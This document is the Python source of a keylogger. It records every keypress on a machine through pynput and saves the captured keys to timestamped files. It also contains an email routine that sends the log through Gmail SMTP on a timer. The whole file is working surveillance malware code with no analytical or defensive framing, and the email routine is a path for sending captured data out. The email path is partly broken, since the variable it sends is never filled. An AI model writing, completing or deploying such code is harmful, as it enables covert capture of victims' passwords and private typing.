import smtplib
from threading import Timer
from datetime import datetime
from pynput.keyboard import Key, Listener

# Configuration
SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_password"

# Variables to track key presses
charCount = 0
keys = []
log = ""
start_dt = datetime.now()
end_dt = datetime.now()

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, key):
        global log, keys, charCount
        try:
            # Print the pressed key to the console
            print('Key Pressed: ', key)
        except Exception as ex:
            print('There was an error: ', ex)

        try:
            if key == Key.esc:
                # When the 'Esc' key is pressed, trigger the report
                self.report()
                return False

            if key == Key.enter:
                key = '\n'  # Replace 'Enter' key with newline character
            elif key == Key.space:
                key = ' '  # Replace 'Space' key with space character

            keys.append(key)
            charCount += 1

            if charCount >= 50:
                # Trigger the report when 50 characters are typed
                self.report()
        except Exception as ex:
            print('Error in callback function:', ex)

    def update_filename(self):
        # Generate a filename based on start and end datetime
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # Write the logged keys to a file
        with open(f"{self.filename}.txt", "a") as f:
            for key in keys:
                key = str(key).replace("'", "")
                if 'key'.upper() not in key.upper():
                    f.write(key)
            f.write("\n")

    def sendmail(self, email, password, message):
        try:
            # Send the log as an email
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Error sending email: {e}")

    def report(self):
        global log, keys, charCount, start_dt
        self.end_dt = datetime.now()
        self.update_filename()

        if self.report_method == "email":
            # Send the log as an email
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, log)
        elif self.report_method == "file":
            # Write the logged keys to a file
            self.report_to_file()  # Add this line
            print(f"[{self.filename}] - {log}")
        start_dt = datetime.now()
        keys = []
        charCount = 0
        log = ""

        # Schedule the next report
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        global start_dt
        start_dt = datetime.now()
        # Start listening to keyboard events
        with Listener(on_press=self.callback) as listener:
            listener.join()

# if __name__ == "__main__":
#     # Create a Keylogger instance and start logging
#     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
#     keylogger.start()
if __name__ == "__main__":
    # Create a Keylogger instance and start logging
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")  # Use "file" as the report method
    keylogger.start()

